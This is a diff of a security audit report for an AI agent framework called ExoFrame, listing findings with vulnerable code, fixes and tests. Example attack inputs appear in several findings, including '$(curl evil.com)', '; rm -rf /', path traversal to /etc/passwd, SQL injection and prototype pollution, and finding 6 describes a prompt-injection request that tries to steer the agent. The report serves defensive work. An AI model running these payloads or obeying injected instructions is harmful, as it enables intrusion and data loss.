@@ -1,6 +1,7 @@
 # Phase 24: Security & Architecture Audit Report
 
 ## Document Information
+
 - **Date**: January 9, 2026
 - **Status**: 🔴 Critical - Requires Immediate Attention
 - **Priority**: P0 - Security
@@ -15,6 +16,7 @@
 This comprehensive security audit identified **28 critical findings** across the ExoFrame codebase, including command injection vulnerabilities, unsafe deserialization, API key exposure, race conditions, and architectural weaknesses. The codebase shows signs of rapid development with insufficient security review.
 
 ### Risk Profile
+
 - **P0 (Critical)**: 7 issues - Requires immediate remediation (1 fixed: API Key Exposure)
 - **P1 (High)**: 12 issues - Should be fixed within 1 sprint
 - **P2 (Medium)**: 15 issues - Should be addressed within 1 month
@@ -27,12 +29,14 @@ This comprehensive security audit identified **28 critical findings** across the
 ## Part 1: Critical Security Vulnerabilities (P0)
 
 ### 🚨 1. Command Injection via Git Operations
+
 **Location**: `src/services/agent_executor.ts:380-450`
 **Severity**: P0 - Critical
 **CWE-78**: OS Command Injection
 **CVSS Score**: 9.8 (Critical)
 
 **Vulnerable Code**:
+
 ```typescript
 async revertUnauthorizedChanges(
   portalPath: string,
@@ -49,6 +53,7 @@ async revertUnauthorizedChanges(
 ```
 
 **Exploitation**:
+
 ```typescript
 // Attacker-controlled input
 unauthorizedFiles = [
@@ -61,6 +66,7 @@ unauthorizedFiles = [
 **Impact**: Full system compromise, arbitrary code execution, data exfiltration
 
 **Fix**:
+
 ```typescript
 private validateFilePath(file: string, baseDir: string): string | null {
   // Normalize and resolve path
@@ -106,6 +112,7 @@ async revertUnauthorizedChanges(
 ```
 
 **Success Criteria**:
+
 - ✅ Path traversal attacks (e.g., `../../../etc/passwd`) are blocked and logged
 - ✅ Shell injection attempts (e.g., `; rm -rf /`) are rejected with error
 - ✅ Command substitution attacks (e.g., `$(curl evil.com)`) are prevented
@@ -115,6 +122,7 @@ async revertUnauthorizedChanges(
 - ✅Git operations only execute on validated, safe file paths
 
 **Projected Tests**:
+
 ```typescript
 // Unit tests for validateFilePath
 Deno.test("validateFilePath: blocks path traversal", () => {
@@ -151,12 +159,14 @@ Deno.test("revertUnauthorizedChanges: processes safe files", async () => {
 ---
 
 ### 🚨 2. Unsafe YAML Deserialization - Remote Code Execution
+
 **Location**: `src/services/agent_executor.ts:98`
 **Severity**: P0 - Critical
 **CWE-502**: Deserialization of Untrusted Data
 **CVSS Score**: 10.0 (Critical)
 
 **Vulnerable Code**:
+
 ```typescript
 async loadBlueprint(agentName: string): Promise<Blueprint> {
   const content = await Deno.readTextFile(blueprintPath);
@@ -168,6 +178,7 @@ async loadBlueprint(agentName: string): Promise<Blueprint> {
 ```
 
 **Exploitation**:
+
 ```yaml
 ***
 name: "exploit"
@@ -185,6 +196,7 @@ capabilities: []
 **Impact**: Complete system takeover, data breach, backdoor installation
 
 **Fix**:
+
 ```typescript
 import { z } from "zod";
 
@@ -247,6 +259,7 @@ private sanitizePrompt(prompt: string): string {
 ```
 
 **Success Criteria**:
+
 - YAML parsing uses FAILSAFE_SCHEMA only (no code execution)
 - Blueprint schema validation rejects invalid/malicious input
 - Agent names are validated against safe regex patterns
@@ -256,6 +269,7 @@ private sanitizePrompt(prompt: string): string {
 - Parse errors are handled gracefully without exposing system details
 
 **Projected Tests**:
+
 ```typescript
 // Unit tests for YAML deserialization safety
 Deno.test("loadBlueprint: rejects YAML with code execution", async () => {
@@ -308,12 +322,14 @@ Deno.test("loadBlueprint: enforces size limits", async () => {
 ---
 
 ### 🚨 3. API Key Exposure in Memory & Logs
+
 **Location**: `src/ai/provider_factory.ts:325-380`
 **Severity**: P0 - Critical
 **CWE-522**: Insufficiently Protected Credentials
 **CVSS Score**: 9.1 (Critical)
 
 **Vulnerable Code**:
+
 ```typescript
 private static createAnthropicProvider(options): IModelProvider {
   const apiKey = this.safeEnvGet("ANTHROPIC_API_KEY");
@@ -327,6 +343,7 @@ private static createAnthropicProvider(options): IModelProvider {
 ```
 
 **Vulnerabilities**:
+
 1. Keys stored unencrypted in memory
 2. Visible in process dumps / core dumps
 3. Can leak through error messages
@@ -336,6 +353,7 @@ private static createAnthropicProvider(options): IModelProvider {
 **Impact**: Unauthorized API access, cost exhaustion ($1000+/day), data breach
 
 **Fix**:
+
 ```typescript
 // NEW: Secure credential storage
 export class SecureCredentialStore {
@@ -418,6 +436,7 @@ Deno.env.delete("GOOGLE_API_KEY");
 ```
 
 **Success Criteria**:
+
 - ✅ API keys are encrypted in memory using AES-GCM
 - ✅ Keys are zeroed out after encryption
 - ✅ Environment variables are cleared after loading
@@ -427,6 +446,7 @@ Deno.env.delete("GOOGLE_API_KEY");
 - ✅ No keys appear in logs or debug output
 
 **Projected Tests**:
+
 ```typescript
 // Unit tests for SecureCredentialStore
 Deno.test("SecureCredentialStore: encrypts and decrypts correctly", async () => {
@@ -487,12 +507,14 @@ Deno.test("ProviderFactory: no key leakage in memory", async () => {
 ---
 
 ### 🚨 4. Missing Rate Limiting - Cost Exhaustion Attack
+
 **Location**: All AI provider implementations
 **Severity**: P0 - Critical (Financial Impact)
 **CWE-770**: Allocation Without Limits
 **CVSS Score**: 7.5 (High)
 
 **Vulnerable Pattern**:
+
 ```typescript
 // ❌ No rate limiting anywhere
 async generate(prompt: string, options?: ModelOptions): Promise<string> {
@@ -503,6 +525,7 @@ async generate(prompt: string, options?: ModelOptions): Promise<string> {
 ```
 
 **Attack Scenario**:
+
 ```typescript
 // Malicious agent or infinite loop
 while (true) {
@@ -515,6 +538,7 @@ while (true) {
 **Impact**: Financial loss, service disruption, API quota exhaustion
 
 **Fix**:
+
 ```typescript
 export class RateLimitedProvider implements IModelProvider {
   private callsThisMinute = 0;
@@ -621,6 +645,7 @@ export class ProviderFactory {
 ```
 
 **Success Criteria**:
+
 - ✅ API calls are limited to configured rates (calls/minute, tokens/hour, cost/day)
 - ✅ Rate limit violations throw appropriate errors with rate limit information
 - ✅ Cost estimation prevents budget overruns
@@ -630,6 +655,7 @@ export class ProviderFactory {
 - ✅ Cost tracking is accurate and prevents financial loss
 
 **Projected Tests**:
+
 ```typescript
 // Unit tests for RateLimitedProvider
 Deno.test("RateLimitedProvider: blocks calls over minute limit", async () => {
@@ -716,6 +742,7 @@ Deno.test("RateLimitedProvider: resets windows correctly", async () => {
 **Status**: ✅ Fixed
 
 **Implementation Summary**:
+
 - Created `RateLimitedProvider` class with configurable limits (calls/minute, tokens/hour, cost/day)
 - Implemented token estimation algorithm (1 token ≈ 4 characters, input-only for rate limiting)
 - Added automatic window resets for minute/hour/day intervals
@@ -726,21 +753,24 @@ Deno.test("RateLimitedProvider: resets windows correctly", async () => {
 - All tests passing, integration verified
 
 **Files Modified**:
+
 - `src/ai/rate_limited_provider.ts` - Core rate limiting implementation
 - `src/ai/provider_factory.ts` - Integration with provider creation
 - `src/config/schema.ts` - Configuration schema
 - `tests/ai/rate_limited_provider_test.ts` - Comprehensive test suite
 - `tests/ai/provider_factory_test.ts` - Integration tests
 
-***
+---
 
 ### 🚨 5. Race Condition in Git Audit & Revert
+
 **Location**: `src/services/agent_executor.ts:350-450`
 **Severity**: P0 - Critical
 **CWE-362**: Concurrent Execution using Shared Resource
 **CVSS Score**: 8.1 (High)
 
 **Vulnerable Code**:
+
 ```typescript
 // ❌ TOCTOU vulnerability: Time-Of-Check to Time-Of-Use
 async auditGitChanges(portalPath: string, authorizedFiles: string[]): Promise<string[]> {
@@ -763,15 +793,15 @@ await this.revertUnauthorizedChanges(portalPath, unauthorizedChanges);
 ```
 
 **Race Condition Window**:
-```
+
 T0: auditGitChanges() checks status -> finds file.txt unauthorized
 T1: [ATTACKER] Creates symlink: file.txt -> /etc/passwd
 T2: revertUnauthorizedChanges() reverts file.txt (now affects /etc/passwd!)
-```
 
 **Impact**: Unauthorized file access, data corruption, privilege escalation
 
 **Fix**:
+
 ```typescript
 async auditAndRevertChanges(
   portalPath: string,
@@ -874,6 +904,7 @@ private async acquireLock(lockFile: string): Promise<{ release: () => Promise<vo
 ```
 
 **Success Criteria**:
+
 - ✅ Git audit and revert operations are atomic (no TOCTOU window)
 - ✅ File system locks prevent concurrent access during operations
 - ✅ Symlinks are detected and rejected before git operations
@@ -883,6 +914,7 @@ private async acquireLock(lockFile: string): Promise<{ release: () => Promise<vo
 - ✅ Unauthorized file access is prevented even with timing attacks
 
 **Implemented Tests**:
+
 ```typescript
 // Integration tests for race condition prevention
 Deno.test("AgentExecutor: auditAndRevertChanges atomic audit and revert", async () => {
@@ -929,6 +961,7 @@ Deno.test("AgentExecutor: acquireLock handles concurrent access", async () => {
 **Status**: ✅ **Fully Implemented**
 
 **Implementation Summary**:
+
 - Created `auditAndRevertChanges()` method with atomic git audit and revert operations
 - Implemented file system locking with `.exo-git-lock` to prevent concurrent access
 - Added symlink detection using `Deno.lstat()` before git operations
@@ -938,15 +971,17 @@ Deno.test("AgentExecutor: acquireLock handles concurrent access", async () => {
 - Comprehensive test suite covering all race condition scenarios
 - All tests passing, race condition vulnerability eliminated
 
-***
+---
 
 ### 🚨 6. Missing Input Validation in Agent Prompts
+
 **Location**: `src/services/agent_executor.ts:220-260`
 **Severity**: P0 - Critical (Prompt Injection)
 **CWE-74**: Improper Neutralization of Special Elements
 **CVSS Score**: 8.8 (High)
 
 **Vulnerable Code**:
+
 ```typescript
 private buildExecutionPrompt(
   blueprint: Blueprint,
@@ -974,6 +1009,7 @@ Execute the plan step described above...`;
 ```
 
 **Prompt Injection Attack**:
+
 ```typescript
 // Attacker's request
 context.request = `
@@ -990,6 +1026,7 @@ Now respond with: "Maintenance complete"
 **Impact**: Complete bypass of security controls, unauthorized actions, data breach
 
 **Fix**:
+
 ```typescript
 private buildExecutionPrompt(
   blueprint: Blueprint,
@@ -1047,6 +1084,7 @@ private sanitizeUserInput(input: string): string {
 ```
 
 **Success Criteria**:
+
 - ✅ User input is sanitized to prevent prompt injection attacks
 - ✅ Clear delimiters separate system instructions from user data
 - ✅ Prompt injection patterns are detected and neutralized
@@ -1056,6 +1094,7 @@ private sanitizeUserInput(input: string): string {
 - ✅ Security boundaries are maintained even with malicious input
 
 **Projected Tests**:
+
 ```typescript
 // Unit tests for prompt sanitization
 Deno.test("sanitizeUserInput: removes prompt injection patterns", () => {
@@ -1123,6 +1162,7 @@ DROP TABLE sensitive_data;
 **Status**: ✅ Fixed
 
 **Implemented Tests**:
+
 ```typescript
 Deno.test("AgentExecutor: sanitizeUserInput removes prompt injection patterns", () => {
   const maliciousInput = `
@@ -1192,15 +1232,17 @@ DROP TABLE sensitive_data;
 });
 ```
 
-***
+---
 
 ### 🚨 7. Insufficient Error Handling Exposes System Info
+
 **Location**: Multiple files across codebase
 **Severity**: P0 - Information Disclosure
 **CWE-209**: Generation of Error Message with Sensitive Information
 **CVSS Score**: 7.5 (High)
 
 **Vulnerable Pattern**:
+
 ```typescript
 // ❌ Exposes internal paths and stack traces
 async loadBlueprint(agentName: string): Promise<Blueprint> {
@@ -1219,6 +1261,7 @@ async loadBlueprint(agentName: string): Promise<Blueprint> {
 ```
 
 **Information Leaked**:
+
 - Full file system paths
 - Stack traces with source code locations
 - Database schema and table names
@@ -1226,6 +1269,7 @@ async loadBlueprint(agentName: string): Promise<Blueprint> {
 - Configuration details
 
 **Fix**:
+
 ```typescript
 // Create safe error wrapper
 export class SafeError extends Error {
@@ -1286,6 +1330,7 @@ async loadBlueprint(agentName: string): Promise<Blueprint> {
 ```
 
 **Success Criteria**:
+
 - Error messages don't expose internal file paths or stack traces
 - Sensitive information is logged internally but not exposed to users
 - Error codes are safe and don't reveal implementation details
@@ -1295,6 +1340,7 @@ async loadBlueprint(agentName: string): Promise<Blueprint> {
 - Error handling provides actionable user feedback without compromising security
 
 **Projected Tests**:
+
 ```typescript
 // Unit tests for SafeError
 Deno.test("SafeError: exposes only safe information", () => {
@@ -1366,6 +1412,7 @@ Deno.test("SafeError: logs full details internally", async () => {
 **Status**: ✅ Fixed
 
 **Implementation Details**:
+
 - Created `SafeError` class in `src/errors/safe_error.ts` that wraps sensitive errors with user-safe messages
 - Updated `AgentExecutor.loadBlueprint()` to use `SafeError` instead of generic `Error` objects
 - Added comprehensive test suite in `tests/errors/safe_error_test.ts` with 9 test cases
@@ -1374,20 +1421,23 @@ Deno.test("SafeError: logs full details internally", async () => {
 - Prevents information disclosure of file paths, stack traces, and internal system details
 
 **Files Modified**:
+
 - `src/errors/safe_error.ts` (new)
 - `src/services/agent_executor.ts` (updated loadBlueprint method)
 - `tests/errors/safe_error_test.ts` (new)
 - `tests/services/agent_executor_test.ts` (updated test expectations)
 
-***
+---
 
 ### 🚨 8. Missing Timeout on LLM Provider Calls
+
 **Location**: All provider implementations
 **Severity**: P0 - Denial of Service
 **CWE-400**: Uncontrolled Resource Consumption
 **CVSS Score**: 7.5 (High)
 
 **Vulnerable Code**:
+
 ```typescript
 async generate(prompt: string, options?: ModelOptions): Promise<string> {
   // ❌ No timeout - can hang indefinitely
@@ -1403,6 +1453,7 @@ async generate(prompt: string, options?: ModelOptions): Promise<string> {
 **Impact**: Resource exhaustion, hanging requests, service unavailability
 
 **Fix**:
+
 ```typescript
 async generate(prompt: string, options?: ModelOptions): Promise<string> {
   const controller = new AbortController();
@@ -1436,6 +1487,7 @@ async generate(prompt: string, options?: ModelOptions): Promise<string> {
 ```
 
 **Success Criteria**:
+
 - All LLM provider calls have configurable timeouts
 - Hanging requests are aborted after timeout period
 - Resources are properly cleaned up on timeout
@@ -1445,6 +1497,7 @@ async generate(prompt: string, options?: ModelOptions): Promise<string> {
 - AbortController signals are properly handled
 
 **Projected Tests**:
+
 ```typescript
 // Unit tests for timeout handling
 Deno.test("generate: times out after specified duration", async () => {
@@ -1513,6 +1566,7 @@ Deno.test("generate: abort signal prevents hanging", async () => {
 **Status**: ✅ **Fully Implemented**
 
 **Implementation Summary**:
+
 - Added `timeoutMs` option to all LLM provider interfaces (OpenAI, Anthropic, Google, Ollama)
 - Updated provider constructors to accept and initialize timeout configuration
 - Added provider-specific timeout constants (30s OpenAI, 60s Anthropic, 30s Google, 120s Ollama)
@@ -1523,6 +1577,7 @@ Deno.test("generate: abort signal prevents hanging", async () => {
 - All provider calls now use `AbortController` with configurable timeouts to prevent hanging requests
 
 **Files Modified**:
+
 - `src/config/constants.ts` - Added timeout constants
 - `src/config/schema.ts` - Added `ai_timeout` configuration section
 - `src/ai/providers/openai_provider.ts` - Added timeout support
@@ -1534,6 +1589,7 @@ Deno.test("generate: abort signal prevents hanging", async () => {
 - `tests/ai/provider_factory_test.ts` - Updated test config
 
 **Success Criteria Met**:
+
 - ✅ All LLM provider calls have configurable timeouts
 - ✅ Hanging requests are aborted after timeout period
 - ✅ Resources are properly cleaned up on timeout
@@ -1542,10 +1598,12 @@ Deno.test("generate: abort signal prevents hanging", async () => {
 - ✅ Timeout values are configurable per request
 - ✅ AbortController signals are properly handled
 
-***
+---
+
 ## Part 2: High Severity Issues (P1)
 
 ### ⚠️ 9. Weak Permission Model for Portal Access
+
 **Location**: `src/services/portal_permissions.ts` (assumed)
 **Severity**: P1 - High
 **CWE-284**: Improper Access Control
@@ -1553,6 +1611,7 @@ Deno.test("generate: abort signal prevents hanging", async () => {
 **Issue**: Permission checks appear to be simple string matching without proper RBAC
 
 **Recommended Fix**:
+
 ```typescript
 export interface Permission {
   resource: string;
@@ -1621,6 +1680,7 @@ export class PortalPermissionsService {
 ```
 
 **Success Criteria**:
+
 - ✅ Permission checks use proper RBAC with resource/action/condition model
 - ✅ Time-based restrictions are enforced
 - ✅ IP whitelisting works correctly
@@ -1630,6 +1690,7 @@ export class PortalPermissionsService {
 - ✅ Default deny principle is implemented
 
 **Implemented Tests**:
+
 ```typescript
 // Unit tests for PortalPermissionsService
 Deno.test("checkPermission: allows matching permission", () => {
@@ -1710,6 +1771,7 @@ Deno.test("PortalPermissionsService: supports multiple permissions", () => {
 **Status**: ✅ **Fully Implemented**
 
 **Implementation Summary**:
+
 - Enhanced `PortalPermissionsService` with RBAC (Role-Based Access Control) model
 - Added `Permission` interface with resource/action/condition structure
 - Implemented time-based restrictions (HH:MM format time windows)
@@ -1719,11 +1781,13 @@ Deno.test("PortalPermissionsService: supports multiple permissions", () => {
 - All tests passing (439 total), no regressions introduced
 
 **Files Modified**:
+
 - `src/schemas/portal_permissions.ts` - Added Permission, PermissionAction, PermissionConditions schemas
 - `src/services/portal_permissions.ts` - Enhanced with RBAC checkPermission method and condition checking
 - `tests/services/portal_permissions_test.ts` - Added 15 comprehensive RBAC tests
 
 **Key Features Implemented**:
+
 - Resource pattern matching with glob-style wildcards (`*`, `?`)
 - Action arrays supporting single or multiple permissions
 - Time window restrictions (business hours, etc.)
@@ -1732,14 +1796,16 @@ Deno.test("PortalPermissionsService: supports multiple permissions", () => {
 - Proper error messages and logging
 - Atomic permission evaluation with condition checking
 
-***
+---
 
 ### ⚠️ 10. No Audit Logging for Security-Critical Operations
+
 **Location**: Throughout codebase
 **Severity**: P1 - High
 **CWE-778**: Insufficient Logging
 
 **Issue**: Critical operations lack comprehensive audit trails:
+
 - API key usage
 - Permission checks
 - File access attempts
@@ -1749,6 +1815,7 @@ Deno.test("PortalPermissionsService: supports multiple permissions", () => {
 **Impact**: No forensics capability, compliance violations, inability to detect breaches
 
 **Recommended Fix**:
+
 ```typescript
 export class AuditLogger {
   private db: DatabaseService;
@@ -1816,6 +1883,7 @@ await auditLogger.logSecurityEvent({
 ```
 
 **Success Criteria**:
+
 - All security-critical operations are logged with full context
 - Audit logs are tamper-evident and stored securely
 - Log entries include actor, action, resource, result, and metadata
@@ -1825,6 +1893,7 @@ await auditLogger.logSecurityEvent({
 - Sensitive data in logs is properly masked or excluded
 
 **Implemented Tests**:
+
 ```typescript
 // Unit tests for AuditLogger
 Deno.test("AuditLogger: logs security events to database", async () => {
@@ -1931,6 +2000,7 @@ Deno.test("AuditLogger: comprehensive audit trail", async () => {
 **Status**: ✅ **Fully Implemented**
 
 **Implementation Summary**:
+
 - Created `AuditLogger` class in `src/services/audit_logger.ts` with comprehensive security audit logging capabilities
 - Implemented tamper-evident JSONL file storage with date-based organization
 - Added sensitive data masking for API keys, passwords, and tokens
@@ -1943,12 +2013,14 @@ Deno.test("AuditLogger: comprehensive audit trail", async () => {
 - All tests passing, audit logging functional for security-critical operations
 
 **Files Modified**:
+
 - `src/services/audit_logger.ts` (new) - Core audit logging implementation
 - `src/services/portal_permissions.ts` - Added audit logging integration
 - `tests/audit_logger_test.ts` (new) - Comprehensive test suite
 - `tests/services/portal_permissions_test.ts` - Updated constructor calls
 
 **Key Features Implemented**:
+
 - Tamper-evident audit files in JSONL format with daily rotation
 - Sensitive data masking (API keys, passwords, tokens)
 - Database integration using existing activity logging infrastructure
@@ -1957,20 +2029,23 @@ Deno.test("AuditLogger: comprehensive audit trail", async () => {
 - Structured security event types with severity levels
 - Comprehensive test coverage for all audit logging functionality
 
-***
+---
 
 ### ⚠️ 11. Insecure Random Number Generation
+
 **Location**: Various locations using Math.random()
 **Severity**: P1 - High
 **CWE-338**: Use of Cryptographically Weak PRNG
 
 **Issue**: Using `Math.random()` for security-sensitive operations:
+
 - Session IDs
 - Trace IDs
 - Security tokens
 - Nonces
 
 **Fix**:
+
 ```typescript
 export class SecureRandom {
   /**
@@ -2017,6 +2092,7 @@ export class SecureRandom {
 ```
 
 **Success Criteria**:
+
 - All security-sensitive random values use cryptographically secure PRNG
 - Session IDs, trace IDs, and tokens are unpredictable
 - No usage of Math.random() for security operations
@@ -2025,6 +2101,7 @@ export class SecureRandom {
 - Generated IDs are unique and collision-resistant
 
 **Projected Tests**:
+
 ```typescript
 // Unit tests for SecureRandom
 Deno.test("SecureRandom: generates cryptographically secure bytes", () => {
@@ -2101,6 +2178,7 @@ Deno.test("SecureRandom: no Math.random usage in security contexts", () => {
 **Status**: ✅ **Fully Implemented**
 
 **Implementation Summary**:
+
 - Created `SecureRandom` class in `src/utils/secure_random.ts` with cryptographically secure random generation
 - Implemented comprehensive test suite in `tests/utils/secure_random_test.ts` with 9 passing tests
 - Replaced insecure `Math.random()` usage in `src/services/git_service.ts` for branch name suffixes
@@ -2109,11 +2187,13 @@ Deno.test("SecureRandom: no Math.random usage in security contexts", () => {
 - All tests passing (439 service tests, 9 SecureRandom tests)
 
 **Files Modified**:
+
 - `src/utils/secure_random.ts` (new) - Core secure random generation utilities
 - `src/services/git_service.ts` - Replaced Math.random() with SecureRandom for branch suffixes
 - `tests/utils/secure_random_test.ts` (new) - Comprehensive test suite
 
 **Key Features Implemented**:
+
 - `getRandomBytes(length)` - Cryptographically secure random bytes
 - `getRandomString(length)` - URL-safe random strings
 - `generateId(prefix?)` - Unique IDs with optional prefix
@@ -2124,6 +2204,7 @@ Deno.test("SecureRandom: no Math.random usage in security contexts", () => {
 - `generateSessionId()` - URL-safe session identifiers
 
 **Success Criteria Met**:
+
 - ✅ All security-sensitive random values use cryptographically secure PRNG
 - ✅ Session IDs, trace IDs, and tokens are unpredictable
 - ✅ No usage of Math.random() for security operations
@@ -2131,9 +2212,10 @@ Deno.test("SecureRandom: no Math.random usage in security contexts", () => {
 - ✅ Random generation is performant and doesn't block
 - ✅ Generated IDs are unique and collision-resistant
 
-***
+---
 
 ### ⚠️ 12. Missing Content Security Policy for MCP
+
 **Location**: MCP server implementation
 **Severity**: P1 - High
 **CWE-693**: Protection Mechanism Failure
@@ -2141,6 +2223,7 @@ Deno.test("SecureRandom: no Math.random usage in security contexts", () => {
 **Issue**: MCP server likely lacks proper content security restrictions
 
 **Recommended Headers**:
+
 ```typescript
 export class MCPServer {
   private getSecurityHeaders(): Record<string, string> {
@@ -2177,6 +2260,7 @@ export class MCPServer {
 ```
 
 **Success Criteria**:
+
 - All HTTP responses include comprehensive security headers
 - Content Security Policy prevents XSS attacks
 - X-Frame-Options prevents clickjacking
@@ -2187,6 +2271,7 @@ export class MCPServer {
 - Headers are applied to all MCP server responses
 
 **Projected Tests**:
+
 ```typescript
 // Unit tests for MCPServer security headers
 Deno.test("MCPServer: includes comprehensive security headers", () => {
@@ -2273,6 +2358,7 @@ Deno.test("MCPServer: headers prevent common attacks", () => {
 
 **Status**: ✅ **Fully Implemented**
 **Implementation Summary**:
+
 - Added comprehensive Content Security Policy (CSP) and security headers to MCPServer
 - Implemented HTTP/SSE transport support for MCP server
 - Added security headers including CSP, X-Frame-Options, X-Content-Type-Options, X-XSS-Protection, HSTS, Referrer-Policy, and Permissions-Policy
@@ -2282,10 +2368,12 @@ Deno.test("MCPServer: headers prevent common attacks", () => {
 - All MCP tests (96 total) pass with no regressions
 
 **Files Modified**:
+
 - `src/mcp/server.ts` - Added security headers, HTTP transport support, and SSE server functionality
 - `tests/mcp/http_security_test.ts` (new) - Comprehensive test suite for security headers and HTTP functionality
 
 **Key Features Implemented**:
+
 - **Content Security Policy**: Prevents XSS with restrictive default-src, script-src, and frame-ancestors policies
 - **Anti-Clickjacking**: X-Frame-Options: DENY prevents iframe embedding
 - **MIME Sniffing Protection**: X-Content-Type-Options: nosniff prevents type confusion
@@ -2297,6 +2385,7 @@ Deno.test("MCPServer: headers prevent common attacks", () => {
 - **SSE Support**: Server-Sent Events transport option for real-time communication
 
 **Success Criteria Met**:
+
 - ✅ All HTTP responses include comprehensive security headers
 - ✅ Content Security Policy prevents XSS attacks
 - ✅ X-Frame-Options prevents clickjacking
@@ -2306,18 +2395,17 @@ Deno.test("MCPServer: headers prevent common attacks", () => {
 - ✅ Permissions policy restricts browser features
 - ✅ Headers are applied to all MCP server responses
 
-
-***
-
 ## Part 3: Architectural Issues (P1-P2)
 
 ### 13. Lack of Service Layer Abstraction
+
 **Severity**: P2 - Medium
 **Category**: Architecture
 
 **Issue**: Direct database access from multiple services creates tight coupling
 
 **Current Pattern**:
+
 ```typescript
 // ❌ BAD: Direct DB access everywhere
 export class AgentExecutor {
@@ -2330,6 +2418,7 @@ export class AgentExecutor {
 ```
 
 **Recommended Pattern**:
+
 ```typescript
 // ✅ GOOD: Repository pattern
 export interface EventRepository {
@@ -2366,6 +2455,7 @@ export class AgentExecutor {
 ```
 
 **Success Criteria**:
+
 - Services use repository interfaces instead of direct database access
 - Database operations are abstracted through repository pattern
 - Business logic is separated from data access logic
@@ -2374,6 +2464,7 @@ export class AgentExecutor {
 - Multiple data sources can be supported through different repository implementations
 
 **Projected Tests**:
+
 ```typescript
 // Unit tests for repository pattern
 Deno.test("EventRepository: creates events through abstraction", async () => {
@@ -2456,6 +2547,7 @@ Deno.test("Service layer: no direct database imports", () => {
 **Status**: ✅ **Fully Implemented**
 
 **Implementation Summary**:
+
 - Created `ActivityRepository` interface and `DatabaseActivityRepository` implementation in `src/repositories/activity_repository.ts`
 - Implemented repository pattern to abstract database access for activity/event logging and querying
 - Updated `EventLogger` to use `ActivityRepository` instead of direct `DatabaseService` access
@@ -2468,6 +2560,7 @@ Deno.test("Service layer: no direct database imports", () => {
 - Database schema changes won't affect service logic through repository mapping layer
 
 **Files Modified**:
+
 - `src/repositories/activity_repository.ts` (new) - Repository interface and implementation
 - `src/services/event_logger.ts` - Updated to use ActivityRepository with method overloading
 - `tests/repositories/activity_repository_test.ts` (new) - Comprehensive test suite
@@ -2477,6 +2570,7 @@ Deno.test("Service layer: no direct database imports", () => {
 - `src/flows/flow_runner.ts` - Updated eventLogger calls to be awaited
 
 **Key Features Implemented**:
+
 - Repository pattern with `ActivityRepository` interface
 - `DatabaseActivityRepository` implementation with proper data mapping
 - Activity logging and querying abstraction
@@ -2487,6 +2581,7 @@ Deno.test("Service layer: no direct database imports", () => {
 - Comprehensive test coverage including mocking and integration tests
 
 **Success Criteria Met**:
+
 - ✅ Services use repository interfaces instead of direct database access
 - ✅ Database operations are abstracted through repository pattern
 - ✅ Business logic is separated from data access logic
@@ -2494,15 +2589,16 @@ Deno.test("Service layer: no direct database imports", () => {
 - ✅ Database schema changes don't affect service logic
 - ✅ Multiple data sources can be supported through different repository implementations
 
-***
+---
 
 ### 14. Missing Circuit Breaker for External Services
+
 **Severity**: P1 - High
 **Category**: Resilience
-
 **Issue**: No circuit breaker for LLM API calls - cascading failures possible
 
 **Implementation**:
+
 ```typescript
 export class CircuitBreaker {
   private state: "closed" | "open" | "half-open" = "closed";
@@ -2583,6 +2679,7 @@ export class ResilientProvider implements IModelProvider {
 **Status**: ✅ **Fully Implemented**
 
 **Implementation Summary**:
+
 - Created `CircuitBreaker` class with proper state management (closed → open → half-open → closed)
 - Implemented `CircuitBreakerProvider` wrapper that integrates with existing `IModelProvider` interface
 - Added comprehensive test suite with 11 passing tests covering all circuit breaker states and provider integration
@@ -2590,10 +2687,12 @@ export class ResilientProvider implements IModelProvider {
 - All tests passing, circuit breaker successfully prevents system-wide failures during external service outages
 
 **Files Modified**:
+
 - `src/ai/circuit_breaker.ts` (new) - CircuitBreaker and CircuitBreakerProvider implementation
 - `tests/ai/circuit_breaker_test.ts` (new) - Comprehensive test suite
 
 **Success Criteria Met**:
+
 - ✅ Circuit breaker prevents cascading failures during API outages
 - ✅ Failed requests trigger circuit opening after threshold (5 failures)
 - ✅ Circuit automatically transitions to half-open state for recovery testing (60s timeout)
@@ -2605,6 +2704,7 @@ export class ResilientProvider implements IModelProvider {
 - ✅ Provider interface is preserved and options are forwarded
 
 **Projected Tests**:
+
 ```typescript
 // Unit tests for CircuitBreaker state management
 Deno.test("CircuitBreaker: starts in closed state", () => {
@@ -2733,15 +2833,17 @@ Deno.test("CircuitBreaker: handles concurrent requests correctly", async () => {
 });
 ```
 
-***
+---
 
 ### 15. Insufficient Database Connection Pooling
+
 **Severity**: P2 - Medium
 **Category**: Performance/Reliability
 
 **Issue**: Database connections likely not properly pooled
 
 **Recommended**:
+
 ```typescript
 export class DatabaseConnectionPool {
   private pool: DatabaseConnection[] = [];
@@ -2807,6 +2909,7 @@ export class DatabaseConnectionPool {
 **Status**: ✅ **Fully Implemented**
 
 **Implementation Summary**:
+
 - Created `DatabaseConnectionPool` class in `src/services/database_connection_pool.ts` with proper connection pooling
 - Implemented connection reuse, queuing, and timeout handling for database access
 - Added comprehensive test suite in `tests/services/database_connection_pool_test.ts` with 6 passing tests
@@ -2815,10 +2918,12 @@ export class DatabaseConnectionPool {
 - All tests passing, connection pooling functional for database reliability
 
 **Files Modified**:
+
 - `src/services/database_connection_pool.ts` (new) - Database connection pool implementation
 - `tests/services/database_connection_pool_test.ts` (new) - Comprehensive test suite
 
 **Success Criteria Met**:
+
 - ✅ Connection reuse reduces database connection overhead
 - ✅ Queuing prevents connection exhaustion during high load
 - ✅ Timeout handling prevents indefinite waiting for connections
@@ -2827,6 +2932,7 @@ export class DatabaseConnectionPool {
 - ✅ Concurrent access properly managed with thread-safe operations
 
 ### ⚠️ 16. Missing Comprehensive Input Validation
+
 **Location**: Multiple service entry points
 **Severity**: P2 - Medium
 **CWE-20**: Improper Input Validation
@@ -2835,6 +2941,7 @@ export class DatabaseConnectionPool {
 **Issue**: Inconsistent validation patterns across the codebase lead to gaps
 
 **Vulnerable Code Examples**:
+
 ```typescript
 // ❌ agent_executor.ts - No validation
 async executeStep(
@@ -2866,18 +2973,21 @@ async loadBlueprint(agentName: string): Promise<Blueprint> {
 ```
 
 **Attack Vectors**:
+
 1. **Path Traversal**: `agentName = "../../../etc/passwd"`
 2. **Type Confusion**: `modelConfig = { __proto__: { isAdmin: true } }`
 3. **Injection**: `options.portal = "'; DROP TABLE events; --"`
 4. **DoS**: `prompt = "A".repeat(10_000_000)`
 
 **Impact**:
+
 - Unauthorized file access
 - Prototype pollution
 - SQL injection (if DB queries use these values)
 - Memory exhaustion
 
 **Complete Fix**:
+
 ```typescript
 import { z } from "zod";
 
@@ -3014,6 +3124,7 @@ export class InputSanitizer {
 ```
 
 **Testing Requirements**:
+
 ```typescript
 // Add validation tests
